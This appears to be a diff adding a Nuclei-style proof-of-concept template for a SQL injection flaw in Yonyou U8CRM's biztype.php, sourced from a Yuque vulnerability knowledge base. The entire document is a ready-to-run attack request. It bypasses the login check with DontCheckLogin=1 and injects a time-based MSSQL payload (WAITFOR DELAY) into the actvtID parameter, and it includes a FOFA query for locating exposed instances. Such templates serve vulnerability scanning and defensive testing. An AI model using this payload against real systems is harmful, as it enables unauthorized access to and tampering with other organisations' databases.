@@ -1,0 +1,29 @@
+id: poc-dm7qdtvyqffb92na
+info:
+  name: 用友U8CRM biztype.php sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dm7qdtvyqffb92na'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dm7qdtvyqffb92na
+    fofa: title="用友U8CRM"
+http:
+- raw:
+  - 'POST /activity/biztype.php?DontCheckLogin=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
+
+    Cookie: PHPSESSID=bgsesstimeout-;
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    actvtID=1%27;WAITFOR+DELAY+%270:0:5%27--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
